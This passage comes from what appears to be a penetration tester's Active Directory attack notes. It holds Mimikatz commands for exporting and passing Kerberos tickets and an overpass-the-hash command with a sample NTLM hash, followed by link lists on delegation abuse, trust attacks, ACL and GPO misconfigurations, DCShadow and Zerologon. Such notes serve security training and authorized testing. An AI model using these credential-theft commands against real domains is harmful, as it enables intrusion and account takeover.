[https://0xeb-bp.github.io/blog/2019/11/21/practical-guide-pass-the-ticket.html](https://0xeb-bp.github.io/blog/2019/11/21/practical-guide-pass-the-ticket.html)

Kerberos Pass-The-Ticket

* Start with writing all tickets to the folder from wihch it was executed.
  * \>privilege :: debug
  * \>sekurlsa::tickets /export
* Now we import one of those as our tikets and drop back into mimikatz
  * \>kerberos::ptt \[0,ab9bf] \[ticket info]
{% endtab %}

{% tab title="OverPTH" %}
Overpass the Hash

* Over abuse NTLM user hash to gain a full Kerberos TGT
* The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticketand avoid the use of NTLM authentication. A simple way to do this is again with the sekurlsa::pth command from Mimikatz.
* \#mimikatz # sekurlsa::pth /user:jeff\_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
{% endtab %}

{% tab title="Kerberos Relay" %}


* [KrbRelay](https://github.com/cube0x0/KrbRelay) - Framework for Kerberos relaying
  * [https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
* [https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)
* [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.htm](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
{% endtab %}
{% endtabs %}

### Abusing Delegation

<details>

<summary>Abusing Constrained Delegation</summary>

* [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [From Kekeo to Rubeus](https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/)
* [Kerberos Delegation, Spns And More...](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more)
* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
* [Kerberos Resource-based Constrained Delegation: Computer Object Take Over](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
* [Resource Based Constrained Delegation](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)
* [A Case Study in Wagging the Dog: Computer Takeover](http://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
* [BloodHound 2.1's New Computer Takeover Attack](https://www.youtube.com/watch?v=RUbADHcBLKg)
* [No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
* [Constructing Kerberos Attacks with Delegation Primitives](https://shenaniganslabs.io/media/Constructing%20Kerberos%20Attacks%20with%20Delegation%20Primitives.pdf)

</details>

<details>

<summary>Abusing Unconstrained Delegation</summary>

* [Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How Compromise of a Single Server Can Compromise the Domain)](https://adsecurity.org/?p=1667)
* [Domain Controller Print Server + Unconstrained Kerberos Delegation = Pwned Active Directory Forest](https://adsecurity.org/?p=4056)
* [Unconstrained Delegation Permissions](https://blog.stealthbits.com/unconstrained-delegation-permissions/)
* [Trust? Years to earn, seconds to break](https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/)
* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
* [Exploiting Unconstrained Delegation](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
* [https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/abusing\_unconstrained\_delegation/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/abusing\_unconstrained\_delegation/)

</details>

### Attacking Domain Trusts

<details>

<summary>Attacking Domain Trusts</summary>

* [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
* [It's All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts](https://adsecurity.org/?p=1588)
* [Active Directory forest trusts part 1 - How does SID filtering work?](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work)
* [The Forest Is Under Control. Taking over the entire Active Directory forest](https://hackmag.com/security/ad-forest/)
* [Not A Security Boundary: Breaking Forest Trusts](https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d)
* [The Trustpocalypse](http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)
* [Pentesting Active Directory Forests](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
* [Security Considerations for Active Directory (AD) Trusts](https://adsecurity.org/?p=282)
* [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

</details>

### Privileges and Permissions

<details>

<summary>Privileges and Permissions</summary>

* [zBang](https://github.com/cyberark/zBang) - zBang is a risk assessment tool that detects potential privileged account threats

### Insecure Usage of High Privilege Accounts

* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_insecure\_usage\_of\_high\_privileged\_accounts/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_insecure\_usage\_of\_high\_privileged\_accounts/)

### Local Admin Privileges

* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_local\_admin\_privileges/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_local\_admin\_privileges/)

### Writeable Executables in Shares

* [https://www.harmj0y.net/blog/redteaming/targeted-trojanation/](https://www.harmj0y.net/blog/redteaming/targeted-trojanation/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_writable\_executables\_on\_shares/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_writable\_executables\_on\_shares/)

### DNSAdmins

* [Abusing DNSAdmins privilege for escalation in Active Directory](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
* [From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration](https://adsecurity.org/?p=4064)
* [Powermad](https://github.com/Kevin-Robertson/Powermad) - PowerShell MachineAccountQuota and DNS exploit tools

### RID

* [Rid Hijacking: When Guests Become Admins](https://blog.stealthbits.com/rid-hijacking-when-guests-become-admins/)

</details>

### Misconfigurations

{% tabs %}
{% tab title="GPO" %}
* [https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [A Redteamer's Guide to GPO's and OU's](https://wald0.com/?p=179)
* [File templates for GPO Abuse](https://github.com/rasta-mouse/GPO-Abuse)
* [GPO Abuse - Part 1](https://rastamouse.me/blog/gpo-abuse-pt1/)
* [GPO Abuse - Part 2](https://rastamouse.me/blog/gpo-abuse-pt2/)
* [SharpGPOAbuse](https://github.com/mwrlabs/SharpGPOAbuse)
* [Grouper](https://github.com/l0ss/Grouper) - A PowerShell script for helping to find vulnerable settings in AD Group Policy.
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_misconfigured\_gpo/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_misconfigured\_gpo/)
{% endtab %}

{% tab title="MSSQL Access" %}
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_misconfgured\_access\_control\_of\_mssql/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_misconfgured\_access\_control\_of\_mssql/)
{% endtab %}

{% tab title="Forest/Domain Trust" %}
* [https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d?gi=43aabaf65628](https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d?gi=43aabaf65628)
* [https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV190006](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV190006)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/attacking\_windows\_domain\_domain\_trust/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/attacking\_windows\_domain\_domain\_trust/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/incorrectly\_configured\_forest\_or\_domain\_trust/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/incorrectly\_configured\_forest\_or\_domain\_trust/)
{% endtab %}

{% tab title="ACLs" %}
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/misconfigured\_access\_control\_lists/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/misconfigured\_access\_control\_lists/)
* [aclpwn.py](https://github.com/fox-it/aclpwn.py) - Active Directory ACL exploitation with BloodHound
* [ADACLScanner](https://github.com/canix1/ADACLScanner) - A tool with GUI or command linte used to create reports of access control lists (DACLs) and system access control lists (SACLs) in Active Directory
* [RACE](https://github.com/samratashok/RACE) - RACE is a PowerShell module for executing ACL attacks against Windows targets.
{% endtab %}

{% tab title="LAPS" %}
* [Exploiting Weak Active Directory Permissions With Powersploit](https://blog.stealthbits.com/exploiting-weak-active-directory-permissions-with-powersploit/)
* [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [Abusing Active Directory Permissions with PowerView](http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/)
* [BloodHound 1.3 – The ACL Attack Path Update](https://wald0.com/?p=112)
* [Scanning for Active Directory Privileges & Privileged Accounts](https://adsecurity.org/?p=3658)
* [Active Directory Access Control List – Attacks and Defense](https://techcommunity.microsoft.com/t5/Enterprise-Mobility-Security/Active-Directory-Access-Control-List-8211-Attacks-and-Defense/ba-p/250315)
* [aclpwn - Active Directory ACL exploitation with BloodHound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_misconfigured\_laps/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_misconfigured\_laps/)
{% endtab %}

{% tab title="RODC" %}
* [https://adsecurity.org/?p=3592](https://adsecurity.org/?p=3592)
{% endtab %}
{% endtabs %}

### DCShadow

<details>

<summary>DCShadow</summary>

* [Privilege Escalation With DCShadow](https://blog.stealthbits.com/privilege-escalation-with-dcshadow/)
* [DCShadow](https://pentestlab.blog/2018/04/16/dcshadow/)
* [DCShadow explained: A technical deep dive into the latest AD attack technique](https://blog.alsid.eu/dcshadow-explained-4510f52fc19d)
* [DCShadow - Silently turn off Active Directory Auditing](http://www.labofapenetrationtester.com/2018/05/dcshadow-sacl.html)
* [DCShadow - Minimal permissions, Active Directory Deception, Shadowception and more](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
* [AD-003 - DCShadow](https://pentestlab.blog/2018/04/16/dcshadow/)

</details>

## Specific Vulnerabilities

<details>

<summary>Specific Vulnerabilities</summary>

### Remote Potato

* [https://github.com/antonioCoco/RemotePotato0](https://github.com/antonioCoco/RemotePotato0)

### PetitPotam

* [https://github.com/topotam/PetitPotam/](https://github.com/topotam/PetitPotam/)
* [https://threatpost.com/microsoft-petitpotam-poc/168163/](https://threatpost.com/microsoft-petitpotam-poc/168163/)
* [https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/](https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/)

### Bronze Bit

* [CVE-2020-17049: Kerberos Bronze Bit Attack – Overview](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview/)

### Zerologon

* [Cobalt Strike ZeroLogon-BOF](https://github.com/rsmudge/ZeroLogon-BOF)
* [CVE-2020-1472 POC](https://github.com/dirkjanm/CVE-2020-1472)
* [Zerologon: instantly become domain admin by subverting Netlogon cryptography (CVE-2020-1472)](https://www.secura.com/blog/zero-logon)

### Skeleton Key

* [AD-002 - Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)

### MS14-068 Kerberos Vulnerability

* [MS14-068: Vulnerability in (Active Directory) Kerberos Could Allow Elevation of Privilege](https://adsecurity.org/?p=525)
* [Digging into MS14-068, Exploitation and Defence](https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/)
* [From MS14-068 to Full Compromise – Step by Step](https://www.trustedsec.com/2014/12/ms14-068-full-compromise-step-step/)

</details>

## Special AD Target

### Unsupported OS

* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_unsupported\_o](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/check\_for\_unsupported\_os/)s

### Microsoft SQL Server

* [How to get SQL Server Sysadmin Privileges as a Local Admin with PowerUpSQL](https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/)
* [Compromise With Powerupsql – Sql Attacks](https://blog.stealthbits.com/compromise-with-powerupsql-sql-attacks/)

### Red Forest

* [Attack and defend Microsoft Enhanced Security Administrative](https://download.ernw-insight.de/troopers/tr18/slides/TR18\_AD\_Attack-and-Defend-Microsoft-Enhanced-Security.pdf)

### Exchange

* [Exchange-AD-Privesc](https://github.com/gdedrouas/Exchange-AD-Privesc)
* [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
* [NtlmRelayToEWS](https://github.com/Arno0x/NtlmRelayToEWS)
